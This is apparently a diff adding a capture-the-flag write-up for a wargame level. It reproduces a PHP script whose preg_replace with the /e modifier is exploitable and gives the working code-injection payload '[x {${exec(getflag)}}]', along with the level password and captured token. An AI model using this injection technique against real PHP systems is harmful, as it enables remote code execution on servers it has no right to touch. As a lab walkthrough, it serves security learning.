@@ -1,0 +1,41 @@
+su level06
+pass: viuaaale9huek52boumoomioc
+
+-------------------------------------------------------------------------------
+simplified php code: ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+-------------------------------------------------------------------------------
+#!/usr/bin/php
+<?php
+function y($m)
+{
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}
+
+function x($y, $z)
+{
+	$a = file_get_contents($y);
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+?>
+-------------------------------------------------------------------------------
+
+
+
+chmod 777 .
+touch text
+chmod 777 text
+
+we can execute shell commands with exec() function:
+vim text -> [x exec(getflag)]
+./level06 text -> it displays the command, we need the command return value
+vim text -> [x {${exec(getflag)}}]
+
+token => wiok45aaoguiboiki2tuin6ub
